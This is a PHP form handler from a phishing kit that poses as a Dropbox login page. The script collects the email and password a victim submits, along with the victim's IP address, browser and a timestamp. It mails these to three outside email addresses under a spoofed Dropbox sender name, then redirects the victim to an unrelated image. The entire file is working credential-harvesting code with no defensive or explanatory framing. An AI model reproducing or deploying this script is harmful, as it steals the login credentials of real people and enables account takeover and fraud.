<?php

$ip = getenv("REMOTE_ADDR");
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$time = date("m-d-Y g:i:a");
$Email = $_POST['Email'];

$msg = "====================================\n";
$msg .= "Dropb Login Info by Hoye\n";
$msg .= "===================================\n";
$msg .= "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "Sent from $ip on $time $browser";
$msg .= "====================================\n";

$to = "lisiijia17@gmail.com, omramy_azad@yahoo.com, kendra_quberry@hotmail.com";
$subject = "DROP $ip $Email";
$from = "From: Dropb<no-reply@dropboxsecured.com>";

mail($to,$subject,$msg,$from);

header("Location: https://www.kanaktrades.com/PHOTO-2019-07-10-11-47-38.jpg");


?>